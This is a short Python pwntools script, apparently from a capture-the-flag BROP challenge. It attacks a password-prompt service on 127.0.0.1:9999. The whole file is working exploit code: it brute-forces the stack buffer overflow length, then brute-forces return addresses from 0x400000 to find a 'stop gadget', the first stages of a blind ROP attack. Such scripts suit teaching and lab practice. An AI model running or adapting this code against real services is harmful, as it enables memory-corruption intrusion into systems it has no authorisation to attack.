from pwn import *

context.log_level = 'debug'

def get_overflow_len():
    cnt = 1
    while 1 :
        try:
            sh = remote('127.0.0.1',9999)
            sh.recvuntil('WelCome my friend,Do you know password?\n')
            sh.sendline('a' * cnt)
            output = sh.recv()
            sh.close()
            if not output.startswith('No password'):
                log.info("get overflow length:" + hex(cnt - 1))
                return cnt - 1
            else:
                cnt += 1
        except EOFError:
            sh.close()
            log.info("get overflow length:" + hex(cnt - 1))
            return cnt - 1


def get_stop_addr(len):
    addr = 0x400000
    while 1:
        try:
            sh = remote('127.0.0.1',9999)
            sh.recvuntil('WelCome my friend,Do you know password?\n')
            payload = 'a' * len + p64(addr)
            sh.sendline(payload)
            output = sh.recv()
            sh.close()
            log.success("get the stop gadget at " + hex(addr))
            return addr          
        except Exception:
            addr +=1
            sh.close()

if __name__ == '__main__':
    length = get_overflow_len()
    addr = get_stop_addr(length)
